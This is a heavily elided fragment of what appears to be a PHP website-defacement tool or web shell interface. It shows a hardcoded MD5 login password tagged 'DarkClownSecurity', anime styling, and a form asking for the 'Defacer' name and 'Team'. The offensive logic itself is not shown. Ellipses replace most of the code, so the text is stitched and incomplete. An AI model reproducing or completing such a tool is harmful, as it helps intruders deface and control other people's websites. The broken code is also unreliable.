...
$password = "b557099edbf2d146367dd92a42a15f7c"; // md5 : DarkClownSecurity
...
<style type="text/css"></style>
		<body background="https://wallpaper-gallery.net/images/anime-dark-background/anime-dark-background-3.jpg">
	...
	font-size: 13px;
        ...
        <nav class="navbar navbar-expand-lg navbar-light bg-light ">
            ...
            <a class="navbar-brand" href="#">
                <img src="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg" width="30" height="30" class="d-inline-block align-top auto" alt="SPL"> 
            </a>
...
<?php										
		...
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='DCS'><br>
		<u>Team</u>: <br>
